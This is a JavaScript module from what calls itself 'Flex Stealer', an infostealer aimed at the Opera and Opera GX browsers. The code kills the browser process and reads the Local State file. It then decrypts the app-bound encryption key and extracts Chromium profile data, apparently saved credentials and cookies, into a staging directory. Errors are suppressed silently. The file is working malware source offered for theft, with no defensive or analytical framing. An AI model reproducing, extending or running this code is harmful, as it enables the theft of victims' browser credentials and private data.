const fs = require('fs-extra');
const path = require('path');
const { getOperaPath, getOperaGXPath, getLocalStatePath } = require('../browser_utils/paths');
const { decryptAppBoundKey } = require('./appBoundDecryptor');
const { extractChromiumData } = require('../browser_utils/chromium_extractor');
const { isProcessRunning, killProcess } = require('../browser_utils/process-manager');

/**
 * Flex Stealer | 2026 - Opera Specialized Module
 * Handles Opera and Opera GX specific profile structures.
 */

async function stealOperaData(type, stagingDir) {
    const browserPath = type === 'Opera GX' ? getOperaGXPath() : getOperaPath();
    const processName = type === 'Opera GX' ? 'opera_gx.exe' : 'opera.exe';
    
    if (!browserPath || !fs.existsSync(browserPath)) return null;

    try {
        if (await isProcessRunning(processName)) {
            await killProcess(processName);
        }

        const localStatePath = getLocalStatePath(type);
        if (!fs.existsSync(localStatePath)) return null;

        const localState = await fs.readJson(localStatePath);
        const encryptedKey = localState.os_crypt && localState.os_crypt.encrypted_key;

        if (encryptedKey) {
            const decryptedKey = await decryptAppBoundKey(encryptedKey);
            if (decryptedKey) {
                return await extractChromiumData({ name: type, path: browserPath }, decryptedKey, stagingDir);
            }
        }
    } catch (err) {
        // Silently continue
    }
    return null;
}

async function run(stagingDir) {
    const opera = await stealOperaData('Opera', stagingDir);
    const operaGX = await stealOperaData('Opera GX', stagingDir);
    return { opera, operaGX };
}

module.exports = {
    run
};